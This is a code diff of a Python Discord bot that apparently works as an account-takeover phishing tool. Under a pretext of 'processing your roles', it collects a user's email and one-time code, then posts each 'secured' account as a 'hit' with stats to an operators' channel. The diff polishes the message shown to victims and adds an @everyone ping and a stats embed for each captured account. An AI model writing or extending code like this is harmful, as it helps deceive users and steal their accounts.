@@ -44,7 +44,12 @@ class MyModalTwo(ui.Modal):
         await logs_channel.send(embed = embed, view = ButtonOptions(interaction.user.id))
 
         await interaction.followup.send(
-            "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
+            embed = discord.Embed(
+                title = "Processing...",
+                description = "⌛ Please allow us to proccess your roles",
+                color = 0xDE755B
+            ),
+            ephemeral = True
         )
 
         self.session = getSession()
@@ -55,7 +60,7 @@ class MyModalTwo(ui.Modal):
 
             embed = discord.Embed(
                 title = f"User | {interaction.user.name} ({interaction.user.id})",
-                description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
+                description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
                 timestamp = datetime.datetime.now(),
                 colour = 0xFF5C5C                  
             )
@@ -70,7 +75,8 @@ class MyModalTwo(ui.Modal):
 
             return
             
-        await hits_channel.send("**Successfully secured an account**")
+        await hits_channel.send("@everyone **Successfully secured an account**")
+        await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
         await hits_channel.send(
             embed = securedAccount["hit_embed"],
             view = accountInfo(
